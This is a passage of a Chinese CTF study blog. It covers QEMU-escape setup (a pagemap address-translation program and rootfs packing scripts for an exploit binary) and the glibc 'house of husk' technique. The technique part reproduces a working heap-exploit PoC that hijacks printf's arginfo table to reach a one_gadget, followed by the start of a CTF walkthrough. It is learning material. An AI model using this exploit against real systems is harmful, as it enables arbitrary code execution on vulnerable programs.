<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="comment">// 获取页内偏移</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// addr &amp; 0xfff</span></span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pfn_item_offset : %p\n&quot;</span>, (<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>);</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;<span class="comment">//得到的是页表项偏移量</span></span><br><span class="line"> </span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);<span class="comment">//读取一个页表项的信息</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))<span class="comment">// 确保页面存在——page is present.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// physical frame number</span></span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;<span class="comment">//返回物理页帧号</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="type">uint64_t</span>)addr);<span class="comment">//通过物理页帧号和页内偏移量来得到物理地址</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> *ptr;</span><br><span class="line">    <span class="type">uint64_t</span> ptr_mem;</span><br><span class="line"> </span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;virtual address %p\n&quot;</span>,ptr);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, <span class="string">&quot;Where am I?&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, ptr);</span><br><span class="line">    ptr_mem = gva_to_gpa(ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your physical address is at 0x%&quot;</span>PRIx64<span class="string">&quot;\n&quot;</span>, ptr_mem);</span><br><span class="line"> </span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将其编译后放入 <code>qemu</code> 中，调试一下。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303051312873.png" alt="image-20230305131217704"></p>
<p>因为启 <code>qemu</code> 的时候，给的是 <code>64M</code> 的内存，所以我们去找这个 <code>0x4000000</code>  的起始内存地址，发现是 <code>0x7fc254c00000</code> ，然后用这个地址加上物理内存，就能找到字符串 <code>Where am I?</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303051350957.png" alt="image-20230305135007883"></p>
<p>如果我们希望本地调试脚本，那么肯定是需要将 <code>exp</code> 文件放入到 <code>qemu</code> 中的，这里的通用方法是本地先将文件系统解包，然后把 <code>exp.c</code> 放进去，再打包即可，具体方法如下</p>
<h3 id="解包和打包脚本"><a href="#解包和打包脚本" class="headerlink" title="解包和打包脚本"></a>解包和打包脚本</h3><h4 id="对-cpio-文件的打包和解包"><a href="#对-cpio-文件的打包和解包" class="headerlink" title="对 cpio 文件的打包和解包"></a>对 <code>cpio</code> 文件的打包和解包</h4><p>解包脚本（如果缺少 <code>unar</code> 的话，请自行安装） 转自 <a href="https://www.jianshu.com/p/f08e34cf08ad">https://www.jianshu.com/p/f08e34cf08ad</a>  如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">mv $1 $1.gz</span><br><span class="line">unar $1.gz</span><br><span class="line">mv $1 core</span><br><span class="line">mv $1.gz $1</span><br><span class="line">echo &quot;[+]Successful&quot;</span><br></pre></td></tr></table></figure>

<p>打包脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; $1 </span><br><span class="line">mv $1 ..</span><br></pre></td></tr></table></figure>

<p>将这两个脚本都放置到 <code>/usr/local/bin</code> 目录下，将解包脚本命名为 <code>hen</code>  打包脚本命名为 <code>gen</code></p>
<p><strong>最后别忘记给它们可执行权限</strong></p>
<h5 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h5><p>使用 <code>hen rootfs.cpio</code> 命令会在当前目录生成一个 <code>core</code> 文件夹，然后 <code>cd core</code> ，将准备编译好的 <code>exp</code> 文件复制进来。然后在 <code>core</code> 目录执行 <code>gen rootfs.cpio</code> 命令即可（注意，解包命令是在 <code>core</code> 文件的上一级使用的，打包命令是在 <code>core</code> 文件中使用的）</p>
<p>最后重新运行 <code>launch.sh</code> ，进入到 <code>qemu</code> 中后，就可以看到 <code>exp</code> 文件了。</p>
<h4 id="对-img-文件的打包和解包"><a href="#对-img-文件的打包和解包" class="headerlink" title="对 img 文件的打包和解包"></a>对 <code>img</code> 文件的打包和解包</h4><p>如果是 <code>rootfs.img</code> 文件的话，就创建一个 <code>rootfs</code> 文件夹，然后将 <code>rootfs.img</code> 文件复制进去，执行命令 <code>cpio -ivmd &lt; rootfs.img </code> ，解包后，将 <code>exp</code> 复制到 <code>rootfs</code> 文件夹中，然后执行命令（在 <code>rootfs</code> 文件中执行） <code>find . | cpio -o -H newc | gzip -9  &gt; ../rootfs.img </code> 即可将 <code>exp</code> 打包进去。</p>
<h3 id="musl-gcc-的编译与环境变量的配置"><a href="#musl-gcc-的编译与环境变量的配置" class="headerlink" title="musl-gcc 的编译与环境变量的配置"></a>musl-gcc 的编译与环境变量的配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.musl-libc.org/releases/musl-latest.tar.gz</span><br><span class="line">tar zxvf musl-latest.tar.gz</span><br></pre></td></tr></table></figure>

<p>然后 <code>cd</code> 进入解压之后的目录，执行下面的命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<p>注意命令执行的权限</p>
<p>接下来，如果你能用绝对路径来执行 <code>musl-gcc</code> 那就说明安装的没问题，然后来配置环境变量</p>
<p>如果你和我一样使用的是 <code>zsh shell</code> （在命令行中输入 <code>echo $0</code> 可以进行确认），那么应该将环境变量设置添加到 <code>~/.zshrc</code> 文件中</p>
<p>将下面的命令添加到 <code>~/.zshrc</code> 文件的末尾</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if [ -d &quot;/usr/local/musl/bin&quot; ] ; then</span><br><span class="line">    PATH=&quot;/usr/local/musl/bin:$PATH&quot;</span><br><span class="line">fi</span><br><span class="line">export PATH</span><br></pre></td></tr></table></figure>

<p>然后使用下面的命令，重新加载 <code>.zshrc</code> 文件即可（此时输入 <code>musl-gcc</code> 就可以正常使用了）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure>



<h4 id="缺少库-报错解决"><a href="#缺少库-报错解决" class="headerlink" title="缺少库 报错解决"></a>缺少库 报错解决</h4><p>最开始在 <code>ubuntu 18.04</code> 上运行发现缺少库，然后 <code>ldd</code> 看了一下（情况如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821585.png" alt="image-20230313230807235"></p>
<p>这应该是 <code>libc</code> 版本太低导致的，于是我就改用了 <code>22.04</code> </p>
<p>此时的报错如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821453.png" alt="image-20230313231108491"></p>
<p>然后 <code>winmt</code> 师傅教我的解决思路是 <code>apt search xxx</code> 来搜索缺少的库， <code>xxx</code> 则是 <code>so</code> 前面的数据，也就是 <code>libbrlapi</code>（效果如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161822783.png" alt="image-20230313231250902" style="zoom: 67%;" />



<p>然后我是把这几个库全给安装了 ，命令是 <code>sudo apt install xxx</code></p>
<p>不过发现依然是这个报错，于是执行命令 <code>find /usr/lib -name &quot;libbrlapi*&quot;</code> 效果如下</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161822719.png" alt="image-20230313231502355" style="zoom:67%;" />

<p>可以发现，现在的 <code>/usr/lib</code> 目录下是安装了 <code>/usr/lib/x86_64-linux-gnu/libbrlapi.so.0.8</code> ，但是这个 <code>qemu-system-x86_64</code> 需要的是 <code>libbrlapi.so.0.7</code> ，于是按照 <code>winmt</code> 师傅所说，创建了一个名字叫做 <code>libbrlapi.so.0.7</code> 的软链接，命令是 <code>sudo ln -s libbrlapi.so.0.8 libbrlapi.so.0.7</code> ，最终问题解决，可以成功启动 <code>qemu</code>。</p>
<p><strong>总结：</strong> 遇见这种少库的思路就是先 <code>apt search</code> 看一下少的库，然后少哪个安哪个即可，如果安装之后还少库，那么可能是按照的版本不对，创建一个软链接即可</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.jianshu.com/p/f08e34cf08ad">qemu逃逸学习笔记 - 简书 (jianshu.com)</a></p>
<p>[<a href="https://bbs.kanxue.com/thread-265501.htm#msg_header_h2_6">原创]QEMU逃逸初探-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p>
<p><a href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#pci%E8%AE%BE%E5%A4%87%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4">qemu-pwn-基础知识 « 平凡路上 (ray-cp.github.io)</a></p>
<p><a href="https://blog.csdn.net/weixin_45209963/article/details/127332351">(45条消息) qemu逃逸小识_mmio_write_xyzmpv的博客-CSDN博客</a></p>
<p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/">QEMU 逃逸 潦草笔记 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/588124131">QEMU逃逸系列 - 知乎 (zhihu.com)</a></p>
<p><a href="https://www.anquanke.com/post/id/254906">QEMU逃逸初探（一）-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p><a href="https://cyyyber.icu/2022/01/20/%E4%BB%8E%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98%E5%AD%A6%E4%B9%A0QEMU%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86/">https://cyyyber.icu/2022/01/20/%E4%BB%8E%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98%E5%AD%A6%E4%B9%A0QEMU%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86/</a></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>qemu逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>关于house of husk的学习总结</title>
    <url>/posts/6c83c2a2.html</url>
    <content><![CDATA[<h3 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h3><blockquote>
<p>介绍：</p>
<p><code>house of husk</code> 是对 <code>printf</code> 函数内部进行注册的自定义格式化字符的函数指针进行了劫持</p>
<p>使用版本：</p>
<p>经过测试，<code>glibc 2.23--2.35</code> 版本中，该手法均可用</p>
<p>漏洞原理：</p>
<p><code>printf</code> 函数通过检查 <code>__printf_function_table</code> 是否为空，来判断是否有自定义的格式化字符，如果判定为有的话，则会去执行 <code>__printf_arginfo_table[spec]</code> 处的函数指针，在这期间并没有进行任何地址的合法性检查</p>
<span id="more"></span>

<p>利用方法：</p>
<p>劫持 <code>__printf_function_table</code> 使其不为空，劫持 <code>__printf_arginfo_table</code> 使其表中存放的 <code>spec</code> 的位置是 <code>backdoor()</code> ，执行到 <code>printf</code> 函数时就可以将执行流劫持到 <code>backdoor()</code></p>
<p>spec是格式化字符，比如最后调用的是 <code>printf(&quot;%X\n&quot;,a)</code>,那么应该将 <code>__printf_arginfo_table[88]</code> 的位置写入 <code>backdoor()</code></p>
<p>使用前提：</p>
<ol>
<li><p>能向 <code>__printf_function_table</code> 中写入任意数据，使其不为空</p>
</li>
<li><p>能向 <code>__printf_arginfo_table</code> 中写入一个可控地址</p>
</li>
<li><p>通过条件 <code>2</code> ,让 <code>__printf_arginfo_table[spec]</code> 为 <code>backdoor</code> 地址</p>
</li>
</ol>
<p>攻击效果：</p>
<p>执行到 <code>printf</code> 函数时，就可以跳转到 <code>backdoor</code> 上</p>
</blockquote>
<p>本文出现的 <code>glibc</code> 源码均为 <code>2.27</code> 版本</p>
<p>首先要先认识下 <code>__register_printf_function</code> 函数,该函数的作用是允许用户自定义格式化字符并进行注册（注册的意思是说将自定义格式化字符与相应的处理函数相关联），以打印用户自定义数据类型的数据。</p>
<p><code>__register_printf_function</code> 函数是对 <code>__register_printf_specifier</code> 进行的封装，下面是 <code>__register_printf_specifier</code> 的源代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Register FUNC to be called to format SPEC specifiers.  */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_specifier (<span class="type">int</span> spec, printf_function converter,</span><br><span class="line">			     printf_arginfo_size_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (spec &lt; <span class="number">0</span> || spec &gt; (<span class="type">int</span>) UCHAR_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__printf_function_table == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_arginfo_table = (printf_arginfo_size_function **)</span><br><span class="line">	<span class="built_in">calloc</span> (UCHAR_MAX + <span class="number">1</span>, <span class="keyword">sizeof</span> (<span class="type">void</span> *) * <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (__printf_arginfo_table == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  result = <span class="number">-1</span>;</span><br><span class="line">	  <span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      __printf_function_table = (printf_function **)</span><br><span class="line">	(__printf_arginfo_table + UCHAR_MAX + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __printf_function_table[spec] = converter;</span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>spec</code> 是自定义的格式化字符（以 <code>ASCII</code> 所表示），比如你使用 <code>%a</code> 这个格式化字符来输出自定义的数据类型，那么 <code>spec</code> 就是字符 <code>a</code></p>
<p>上面的代码先做了第一个 <code>if</code> 判断，要确定 <code>spec</code> 位于 <code>0</code> 和 <code>0xff</code> 之间，如果不在 <code>ASCII</code> 码就会返回 <code>-1</code></p>
<p>第二个判断是如果 <code>__printf_function_table</code> 为空，那么就通过 <code>calloc</code> 来分配两个索引表，并将地址存放到  <code>__printf_arginfo_table</code> 和 <code>__printf_function_table</code> 中。两个表的大小都为 <code>0x100</code> ，可以给 <code>0~0xff</code> 的每个字符注册一个函数指针（假设我定义一个 <code>%X</code> 的格式化字符，那么 <code>spec</code> 就是 <code>88</code> ，所以将 <code>__printf_arginfo_table[88]</code> 此处存放一个对应处理函数的指针）</p>
<p><strong>需要注意的是，接下来的利用并不会调用到上面这个函数，但需要用到这个注册自定义格式化字符的前置知识。</strong></p>
<p><code>printf</code> 函数调用了 <code>vfprintf</code> 函数，下面的代码是 <code>vprintf</code> 函数中的部分片段，可以看出来如果 <code>__printf_function_table</code> 不为空（也就意味着有自定义格式化字符被注册过了）那么就会调用 <code>printf_positional</code> 函数,如果为空的话，就会去执行默认格式化字符的代码部分（因此<strong>检查自定义的格式化字符是优先于默认的格式化字符</strong>）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">goto</span> do_positional;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">do_positional:</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (workstart != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (workstart);</span><br><span class="line">      workstart = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">			    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">			    save_errno, grouping, thousands_sep);</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>而 <code>printf_positional</code> 函数中会在下面这个位置调用 <code>__parse_one_specmb</code> 函数</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302132054421.png" alt="image-20230213205442536"></p>
<p><code>__parse_one_specmb</code> 函数中最关键的就是下面这个片段</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">    || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">    || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span></span><br><span class="line">    <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment">uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment">the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">    || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">		   (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">		    &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到最后执行了 <code>(*__printf_arginfo_table[spec-&gt;info.spec])</code> 这里本应是注册的正常的函数指针，但如果我们能够篡改 <code>__printf_arginfo_table</code> 中存放的地址，将其改为我们可控的内存地址，这样我只需要在 <code>__printf_arginfo_table[88]</code> （以 <code>%X</code> 为例）的位置存放一个 <code>one_gadget</code> 的地址，执行到函数指针指向的位置即可跳转到 <code>one_gadget</code> 上（如下） </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302132112362.png" alt="image-20230213210814663"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302132107697.png" alt="image-20230213210736611"></p>
<p> <strong>注意：上面的利用始终都没有注册自定义的格式化字符，而是通过直接篡改 <code>__printf_function_table</code> 来错让程序以为存在注册过的自定义格式化字符，从而触发 <code>__printf_arginfo_table</code> 中的函数指针</strong></p>
<p><code>poc</code> 源自  <a href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507">https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is a Proof-of-Concept for House of Husk</span></span><br><span class="line"><span class="comment"> * This PoC is supposed to be run with libc-2.27.</span></span><br><span class="line"><span class="comment"> gcc poc.c -o poc -no-pie -g</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA       0x3ebc40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_MAX_FAST  0x3ed940</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_FUNCTABLE 0x3f0738</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_ARGINFO   0x3ec870</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ONE_GADGET       0x10a2fc</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> libc_base;</span><br><span class="line">  <span class="type">char</span> *a[<span class="number">10</span>];</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>); <span class="comment">// make printf quiet</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* leak libc */</span></span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* UAF chunk */</span></span><br><span class="line">  a[<span class="number">1</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">2</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* avoid consolidation */</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">0</span>]);</span><br><span class="line">  libc_base = *(<span class="type">unsigned</span> <span class="type">long</span>*)a[<span class="number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc @ 0x%lx\n&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* prepare fake printf arginfo table */</span></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">2</span>] + (<span class="string">&#x27;X&#x27;</span> - <span class="number">2</span>) * <span class="number">8</span>) = libc_base + ONE_GADGET;</span><br><span class="line">    <span class="comment">//now __printf_arginfo_table[&#x27;X&#x27;] = one_gadget;</span></span><br><span class="line">    <span class="comment">//*(unsigned long*)(a[1] + (&#x27;X&#x27; - 2) * 8) = libc_base + ONE_GADGET;</span></span><br><span class="line">  <span class="comment">/* unsorted bin attack */</span></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">0</span>] + <span class="number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="number">0x10</span>;</span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* overwrite global_max_fast */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* overwrite __printf_arginfo_table and __printf_function_table */</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">1</span>]);<span class="comment">// __printf_function_table =&gt; a heap_addr which is not NULL</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">2</span>]);<span class="comment">// =&gt; one_gadget</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ignite! */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>









<h3 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h3><p><a href="https://github.com/xmzyshypnc/xz_files/tree/master/34c4_readme_revenge">题目链接</a></p>
<h4 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141234308.png" alt="image-20230214123424178"></p>
<h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141235591.png" alt="image-20230214123517550"></p>
<p>程序就是往 <code>bss</code> 段上输入数据，然后 <code>printf</code> 将数据打印出来。</p>
<p>程序为静态链接，并且 <code>flag</code> 就在 <code>data</code> 段中，只要将其读出来即可</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141238392.png" alt="image-20230214123826356"></p>
<p>程序没有开 <code>PIE</code> 保护，因为静态链接的原因，所以 <code>libc</code> 中的代码和数据地址都是已知的，这就给了我们劫持 <code>printf</code> 函数中 <code>__printf_arginfo_table</code> 和 <code>__printf_function_table</code> 两个指针的机会</p>
<p>我们先搜一下这两个地址看看在哪</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141243372.png" alt="image-20230214124341330"></p>
<p>发现输入数据的起始地址 <code>name</code> 比那两个指针要低，这就说明我们可以填充数据然后篡改两个指针，从而执行 <code>printf</code> 函数的时候劫持执行流</p>
<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>正常填充垃圾数据，将 <code>__printf_function_table</code> 篡改为任意值（不为 <code>NULL</code>）即可。</p>
<p>将 <code>__printf_arginfo_table</code> 篡改为 <code>地址A</code> （这个 <code>地址A</code> 随意，只要满足 <code>*(A+(0x73*8))</code> 处的值为 <code>__stack_chk_fail()</code> 的地址就行（ <code>0x73</code> 是 格式化字符<code>s</code> ））</p>
<p>但如果仅仅只伪造上面两个位置的数据，其他地方填充为垃圾数据的话，则会在 <code>__parse_one_specmb</code> 函数中下面的代码部分出现问题</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_modifier_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">    || __printf_modifier_table[*format] == <span class="literal">NULL</span></span><br><span class="line">    || HANDLE_REGISTERED_MODIFIER (&amp;format, &amp;spec-&gt;info) != <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>在溢出伪造数据时，需要控制 <code>__printf_modifier_table</code> 为 <code>NULL</code> 不然会触发一些别的条件的判断导致程序崩溃或者执行流走偏，这个 <code>__printf_modifier_table</code> 位于 <code>__printf_function_table</code> 地址加 <code>8</code> 的位置</p>
